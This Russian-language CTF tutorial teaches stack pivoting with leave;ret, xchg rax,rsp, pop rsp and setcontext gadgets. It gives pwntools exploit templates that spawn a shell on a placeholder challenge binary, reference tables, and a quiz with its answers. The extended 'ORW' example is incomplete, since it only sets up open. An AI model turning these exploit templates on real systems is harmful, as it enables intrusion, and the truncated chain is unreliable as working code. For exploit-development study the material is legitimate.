---
id: pwn-stack-pivot
title: "Stack pivot: подмена стека и xchg rsp"
category: pwn
parent: pwn-rop-techniques
difficulty: hard
order: 4
tags: [stack-pivot, rsp, leave-ret, xchg, rop]
prerequisites: [pwn-rop, pwn-gadget-hunting]
useful_for:
  - "CTF Pwn категория"
  - "Построение ROP-цепочек"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Разбираем stack pivot: как перенести RSP в контролируемую область памяти (bss/heap) гаджетами leave;ret или xchg rsp,rax и построить там длинную ROP-цепочку."
---
Stack pivot — техника подмены указателя стека, позволяющая перевести исполнение ROP-цепочки в контролируемую область памяти. Нужна, когда переполнение слишком короткое (не вмещает длинную цепочку), когда цепочку удобнее разместить в `.bss` или куче, либо когда требуется вернуться к «своему» стеку после сложного вызова. Основные примитивы: `leave; ret`, `xchg rax, rsp; ret`, `mov rsp, rbp; pop rbp; ret` и «двойной pivot» через `setcontext`.

## Зачем нужен stack pivot

Типичные ситуации:

- Буфер переполнения вмещает лишь 16-24 байта после адреса возврата — мало для полной цепочки.
- Цепочка уже лежит в `.bss` (например, после `read`), и надо на неё перейти.
- Нужно выполнить длинный ORW-шеллкод-цепочку, а места на стеке нет.
- В kernel pwn — перейти со «сломанного» стека на подготовленную область (например, через `swapgs_restore_regs_and_return_to_usermode`).

## Гаджет leave; ret

Инструкция `leave` эквивалентна `mov rsp, rbp; pop rbp`. Если мы контролируем `rbp`, то после `leave` стек переместится в область, на которую указывает `rbp`. Комбинация `leave; ret` позволяет:

1. Записать в сохранённый `rbp` адрес фейкового стека (например, `.bss`).
2. Поставить адрес гаджета `leave; ret` на место возврата.
3. После возврата `leave` перенесёт `rsp` в фейковый стек, а `ret` снимет с него первый адрес — начало новой цепочки.

```python
payload  = b'A' * 64
payload += p64(fake_stack)          # сохранённый rbp -> фейковый стек
payload += p64(leave_ret)           # адрес leave; ret
```

## Гаджет xchg rax, rsp

Если `rax` указывает на контролируемую память (например, результат `read` или `mmap`), гаджет `xchg rax, rsp; ret` меняет местами `rax` и `rsp`. После него стек — это область, куда указывал `rax`. Найти: `ROPgadget --binary ./libc.so.6 | grep 'xchg rax, rsp'` или `ropper --semantic --search 'xchg rax, rsp'`.

## Полный пример: pivot в bss

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72
bss = elf.bss() + 0x400
leave_ret = ROP(elf).find_gadget(['leave', 'ret']).address

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # stage 1: read(0, bss, 0x200) — цепочка читается в bss, затем pivot
    rop = ROP(elf)
    rop.read(0, bss, 0x200)
    rop.raw(leave_ret)                # после read rbp должен указывать на bss
    p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
    # stage 2: сама цепочка в bss (например, system('/bin/sh'))
    rop2 = ROP(elf)
    rop2.call(elf.plt['system'], [next(elf.search(b'/bin/sh'))])
    p.send(rop2.chain())
    p.interactive()

exploit()
```

Практическая тонкость: `leave` берёт `rbp`, а не какой-то регистр с адресом bss. Значит, перед `leave_ret` нужно, чтобы `rbp` указывал на bss. Это достигается либо перезаписью сохранённого `rbp` в первом payload, либо использованием `pop rbp; ret` с адресом bss.

## Продвинутый pivot: setcontext

Функция `setcontext` в libc восстанавливает регистры (включая `rsp`, `rip`) из структуры `ucontext_t`, на которую указывает `rdi`. Это мощнейший pivot: если контролировать `rdi`, можно задать сразу и стек, и точку исполнения.

```python
# в современных glibc смещение полей ucontext_t сдвинулось
frame = SigreturnFrame()   # или вручную собранный ucontext
# rdi -> адрес структуры, setcontext переносит rsp/rip
```

Альтернатива — `__libc_csu_init`/`longjmp`-трюки. В kernel pwn аналог — `swapgs_restore_regs_and_return_to_usermode` для возврата в userland.

## Тонкости и подводные камни

- **`leave` требует корректного `rbp`.** Если `rbp` не перезаписан, pivot уйдёт в мусор.
- **Фейковый стек должен быть writable и содержать валидную цепочку.** Проверьте, что туда действительно записались данные.
- **`add rsp, N` после pivot.** Некоторые гаджеты меняют `rsp` — учитывайте смещение.
- **Выравнивание.** После pivot стек может оказаться невыровненным — добавьте `ret`.
- **ASLR.** Адрес `.bss` при PIE неизвестен — нужна утечка.
- **`xchg` портит rax.** Если rax использовался дальше, учтите это.
- **Многошаговые pivot.** Иногда нужен pivot в pivot: сначала в bss, оттуда — в другой регион.

## Справочные таблицы

| Гаджет | Эффект |
|---|---|
| `leave; ret` | `rsp = rbp; pop rbp; ret` |
| `xchg rax, rsp; ret` | стек = rax |
| `mov rsp, rbp; pop rbp; ret` | как leave |
| `pop rsp; ret` | прямой контроль rsp |
| `setcontext+off` | полный контроль регистров |
| `swapgs_restore...` | возврат в userland (kernel) |

| Ситуация | Pivot |
|---|---|
| короткое переполнение | leave; ret в bss |
| rax указывает на данные | xchg rax, rsp |
| контроль rdi | setcontext |
| kernel | swapgs_restore |

## Что дальше / решение

Дальше: `pwn-seccomp-srop` (SROP как частный случай pivot через `rt_sigreturn`), `pwn-fsop` (pivot через `_IO_FILE`), `pwn-kernel-rop` (pivot в ядре). Практический алгоритм: (1) определите, влезает ли цепочка на стек; (2) если нет — найдите writable-регион (bss/heap) и способ записать туда цепочку; (3) найдите pivot-гаджет (`leave; ret`, `xchg`, `pop rsp`); (4) первым payload переведите `rsp` в этот регион; (5) убедитесь в выравнивании. Stack pivot — обязательный навык для длинных цепочек и сложных целей.

## Pivot через pop rsp

Гаджет `pop rsp; ret` — самый прямой способ подменить стек: он снимает со стека значение и делает его новым `rsp`. Если такой гаджет есть (часто в libc), цепочка собирается так: адрес `pop rsp; ret`, следом адрес новой области, далее — цепочка в этой области. Ограничение: между `pop rsp` и следующей инструкцией `ret` должно быть корректно, иначе падение.

## Pivot через контролируемый rbp без leave

Иногда гаджета `leave; ret` нет, но есть `mov rsp, rbp; pop rbp; ret` — функционально то же самое. Ещё вариант: `mov esp, ebp; pop ebp; ret` в 32-битных бинарях. Ищите любые последовательности, записывающие rbp/rax/rdi в rsp.

## Двухступенчатый pivot в kernel

В kernel pwn после получения контроля над RIP часто применяют pivot на заранее подготовленный ROP-стек в userland (например, через `swapgs_restore_regs_and_return_to_usermode`), потому что текущий стек ядра ненадёжен. Схема: сохранить userland-регистры (cs, ss, rsp, rip) в известную область, затем pivot и выполнить `iretq`/`swapgs; iretq` для возврата. Подробнее — в `pwn-kernel-rop`.

## Сравнение техник pivot

| Гаджет | Требует | Плюсы | Минусы |
|---|---|---|---|
| `leave; ret` | контроль rbp | почти всегда есть | нужен валидный rbp |
| `pop rsp; ret` | — | простой | есть не всегда |
| `xchg rax, rsp` | rax = цель | одна инструкция | портит rax |
| `setcontext` | контроль rdi | полный контроль | сложный frame |
| `mov rsp,rbp;pop rbp;ret` | контроль rbp | аналог leave | реже встречается |

## Расширенный пример: pivot с последующей ORW

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
OFFSET = 72

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # утечка libc
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']]); rop.call(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
    bss = elf.bss() + 0x600
    leave_ret = libc.address + ROP(libc).find_gadget(['leave', 'ret']).address
    # stage 1: залить длинную цепочку в bss и pivot
    rop2 = ROP(elf)
    rop2.read(0, bss, 0x300)
    rop2.raw(leave_ret)
    p.sendlineafter(b'> ', flat({OFFSET: rop2.chain(), 0x40: p64(bss)}))
    # stage 2: ORW в bss
    chain  = p64(libc.address + ROP(libc).find_gadget(['pop rdi','ret']).address)
    chain += p64(bss + 0x200) + p64(libc.symbols['open'])
    p.send(chain)
    p.interactive()

exploit()
```

Обратите внимание на запись по смещению `0x40` — это сохранённый `rbp`, который `leave` использует как новый `rsp`. Именно его нужно направить в bss, а не только адрес возврата.

## Взаимодействие pivot с канарейкой и PIE

Pivot не отменяет других митигаций. Если включена канарейка, её нужно сохранить или перезаписать `__stack_chk_fail`; если PIE — знать адрес `.bss` (утечка базы). Часто комбинируют: сначала утечка базы и канарейки, затем pivot. При этом фейковый стек в `.bss` должен быть выровнен на 8 (а для SSE — на 16), иначе вызов libc-функций упадёт на `movaps`. Проверяйте выравнивание: адрес bss, кратный 16, плюс корректное число слов в цепочке.

## Pivot в задачах с коротким переполнением

Классический случай: буфер 16 байт, после него canary, rbp и возврат. Места для длинной цепочки нет — влезает лишь один-два адреса. Тогда единственный выход — pivot: первым делом `read(0, bss, 0x200)`, затем переход на bss. Иногда места не хватает даже на вызов `read`, и тогда используется гаджет `pop rbp; ret` с последующим `leave; ret`, чтобы сразу перенести стек в область, куда мы уже успели записать данные другим примитивом.

## Заключение

Stack pivot — навык, отделяющий решение «в лоб» от профессионального. Длинная цепочка в `.bss`, возврат к своему стеку, kernel-переход — всё это pivot. Держите в арсенале `leave; ret`, `pop rsp; ret` и `xchg rax, rsp`, и короткие переполнения перестанут быть проблемой.

## Квиз

```quiz
- question: "Что делает гаджет leave; ret?"
  options:
    - "mov rsp, rbp; pop rbp; ret — переносит стек в rbp"
    - "Обнуляет стек"
    - "Отключает NX"
    - "Снимает canary"
  answer: 0
  explanation: "leave устанавливает rsp=rbp, затем ret переходит по адресу из новой области."
- question: "Зачем нужен stack pivot?"
  options:
    - "Перенести стек в контролируемую область для длинной цепочки"
    - "Отключить ASLR"
    - "Снять canary"
    - "Расширить tcache"
  answer: 0
  explanation: "Pivot позволяет разместить ROP-цепочку там, где есть место/контроль."
- question: "Что делает xchg rsp, rax; ret?"
  options:
    - "Меняет местами стек и rax (стек -> контролируемая область)"
    - "Обнуляет rax"
    - "Отключает GOT"
    - "Пишет canary"
  answer: 0
  explanation: "Если rax указывает на буфер, xchg переносит туда стек."
- question: "Куда часто переносят стек?"
  options:
    - "В .bss или кучу (известные/контролируемые области)"
    - "В GOT"
    - "В canary"
    - "В vDSO"
  answer: 0
  explanation: ".bss/heap дают известный адрес и контроль содержимого."
- question: "Как заполнить перенесённый стек цепочкой?"
  options:
    - "Через read(0, bss, N) перед pivot"
    - "Через malloc"
    - "Через printf"
    - "Через exit"
  answer: 0
  explanation: "read записывает длинную цепочку в .bss, затем pivot туда."
```

## Где пригодится

- **CTF:** Pwn — задачи с малым буфером/сложным стеком.
- **Bug bounty:** построение цепочек.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
